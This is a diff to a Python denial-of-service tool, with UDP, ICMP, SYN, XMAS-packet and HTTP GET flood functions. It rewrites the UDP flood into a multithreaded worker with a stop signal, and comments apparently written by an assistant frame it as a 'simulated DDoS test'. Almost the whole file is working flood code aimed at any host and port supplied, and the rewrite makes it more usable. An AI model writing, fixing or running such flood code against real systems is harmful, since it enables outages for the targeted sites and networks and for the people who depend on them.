@@ -8,62 +8,108 @@ import sys
 import threading
 import time
 
-
 loops = 10000
 
 
 def send_packet(amplifier, host, port):
+    global s
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((str(host), int(port)))
         while True: s.send(b"\x99" * amplifier)
-    except: return s.close()
+    except:
+        return s.close()
 
 
-def timer(timeout):
-   while True:
-       if time.time() > timeout: exit()
-       if time.time() < timeout: time.sleep(0.1)
+# This is the new worker function that each thread will run.
+# It continuously calls send_packet until the 'stop_event' is set.
+def udp_worker(stop_event, packet_size, host, port):
+    """
+    A worker function that sends packets in a loop until signalled to stop.
+    """
+    while not stop_event.is_set():
+        send_packet(packet_size, host, port)
+        # You might want a tiny sleep to prevent 100% CPU usage on one core
+        # just from this loop, depending on how fast send_packet is.
+        # time.sleep(0.001)
 
 
-def attack_UDP(method, host, port, duration):
-    timeout = time.time() + duration
-    timer(timeout)
+# --- Your Corrected Test Function ---
+
+def attack_UDP(method, host, port, duration, threads_per_method=100):
+    """
+    Runs a simulated DDoS test for a specific duration.
+
+    :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix")
+    :param host: Target IP address
+    :param port: Target port
+    :param duration: How long the test should run, in seconds
+    :param threads_per_method: How many concurrent threads to spawn for each task
+    """
+    print(f"--- Starting test: {method} on {host}:{port} for {duration} seconds ---")
+
+    # A threading.Event is a safe way to signal threads to stop.
+    stop_event = threading.Event()
+    threads = []
+
+    # A helper function to create and start a thread
+    def launch_thread(size):
+        # Note: we use `args` to pass arguments to the target function
+        thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
+        thread.daemon = True  # Daemon threads will exit when the main program exits
+        thread.start()
+        threads.append(thread)
+
     if method == "UDP-Flood":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
-    if method == "UDP-Power":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
-    if method == "UDP-Mix":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
-            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
+        for _ in range(threads_per_method):
+            launch_thread(375)
+    elif method == "UDP-Power":
+        for _ in range(threads_per_method):
+            launch_thread(750)
+    elif method == "UDP-Mix":
+        for _ in range(threads_per_method):
+            launch_thread(375)
+            launch_thread(750)
+    else:
+        print(f"Error: Unknown method '{method}'")
+        return  # Exit the function if the method is invalid
+
+    # Let the threads run for the specified duration
+    time.sleep(duration)
+
+    # The timer has expired, now we signal the threads to stop
+    print("\n--- Timeout reached. Signaling threads to stop... ---")
+    stop_event.set()
+
+    # (Optional but good practice) Wait for all threads to finish cleanly
+    # for thread in threads:
+    #     thread.join()
+
+    print(f"--- Test function for {method} has finished. ---")
 
 
-def icmpflood(target,cycle):
-    for x in range (0,int(cycle)):
-        send(IP(dst=target)/ICMP())
-
-
-def synflood(target,targetPort,cycle):
+def icmpflood(target, cycle):
     for x in range(0, int(cycle)):
-        send(IP(dst=target)/TCP(dport=targetPort,
-                                flags="S",
-                                seq=RandShort(),
-                                ack=RandShort(),
-                                sport=RandShort()))
+        send(IP(dst=target) / ICMP())
 
-def xmasflood(target,targetPort,cycle):
+
+def synflood(target, targetPort, cycle):
     for x in range(0, int(cycle)):
-        send(IP(dst=target)/TCP(dport=targetPort,
-                                flags="FSRPAUEC",
-                                seq=RandShort(),
-                                ack=RandShort(),
-                                sport=RandShort()))
+        send(IP(dst=target) / TCP(dport=targetPort,
+                                  flags="S",
+                                  seq=RandShort(),
+                                  ack=RandShort(),
+                                  sport=RandShort()))
 
 
+def xmasflood(target, targetPort, cycle):
+    for x in range(0, int(cycle)):
+        send(IP(dst=target) / TCP(dport=targetPort,
+                                  flags="FSRPAUEC",
+                                  seq=RandShort(),
+                                  ack=RandShort(),
+                                  sport=RandShort()))
 
 
 # Parse inputs
@@ -75,14 +121,16 @@ num_requests = 0
 # Create a shared variable for thread counts
 thread_num = 0
 thread_num_mutex = threading.Lock()
-def attack_http_flood(target,target_port,num_of_requests):
+
+
+def attack_http_flood(target, target_port, num_of_requests):
     host = target
     port = target_port
     num_requests = num_of_requests
     try:
         ip = socket.gethostbyname(host)
     except socket.gaierror:
-        print (" ERROR\n Make sure you entered a correct website")
+        print(" ERROR\n Make sure you entered a correct website")
         sys.exit(2)
     print(f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
 
@@ -99,6 +147,7 @@ def attack_http_flood(target,target_port,num_of_requests):
     for current_thread in all_threads:
         current_thread.join()  # Make the main thread wait for the children threads
 
+
 # Print thread status
 def print_status():
     global thread_num
@@ -106,7 +155,7 @@ def print_status():
 
     thread_num += 1
     #print the output on the sameline
-    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
+    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
     sys.stdout.flush()
     thread_num_mutex.release()
 
@@ -135,10 +184,8 @@ def attack_http_flood_helper():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+        print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
-
-
